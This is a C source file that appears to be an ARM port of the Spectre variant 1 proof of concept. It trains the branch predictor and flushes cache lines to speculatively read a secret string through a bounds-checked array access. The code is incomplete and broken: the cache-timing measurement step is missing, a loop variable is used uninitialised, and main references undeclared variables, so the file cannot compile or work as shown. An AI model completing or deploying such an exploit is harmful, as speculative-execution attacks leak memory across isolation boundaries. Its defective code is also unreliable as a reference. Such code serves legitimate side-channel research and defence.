#include <stdio.h>
#include <stdlib.h> 
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

/********************************************************************
Victim code.
********************************************************************/
volatile uint64_t counter = 0;
uint64_t miss_min = 0;
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[10240 * 64];

char* secret = "I'm not a hacker!";
size_t y = 0;
uint8_t temp = 0xaa; /* Used so compiler won't optimize out victim_function() */

void* buf;
static char tmp;

void itoa(char* s, int i) {
    s[0] = i & 0xff;
    s[1] = (i >> 8) & 0xff;
    s[2] = (i >> 16) & 0xff;
    s[3] = (i >> 24) & 0xff;
}

void victim_function(size_t x) {
	if (x < array1_size) {
		temp &= array2[array1[x] * 512];
	}
}

static inline void flush(void *addr) {
	asm volatile ("dc civac, %0" : : "r" (addr));
	asm volatile("dsb sy");
}


/********************************************************************
Analysis code
********************************************************************/

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i;
	size_t training_x, x;
	register uint64_t time2;

	for (i = 0; i < 256; i++)
		results[i] = 0;

	/* Flush array2[256*(0..255)] from cache */
	for (i = 0; i < 256; i ++)
		flush(&array2[i * 512]); /* intrinsic for clflush instruction */

	/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
	training_x = tries % array1_size;
	for (j = 29; j >= 0; j--) {

		flush(&array1_size);
		for (volatile int z = 0; z < 1000; z++)
		{
		} /* Delay (can also mfence) */

		/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
		/* Avoid jumps in case those tip off the branch predictor */
		x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
		x = training_x ^ (x & (malicious_x ^ training_x));

		/* Call the victim! */
		victim_function(x);
	}

}

int main(int argc, const char ** argv) {

	printf("Putting '%s' in memory\n", secret);
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int len = 1;


	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

	asm volatile ("dsb sy");
	
	printf("Reading %d bytes:\n", len);
	while (-- len >= 0) {
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
		readMemoryByte(malicious_x ++, value, score);
	}

	printf("read finish!\n");
	
	return 0;
}
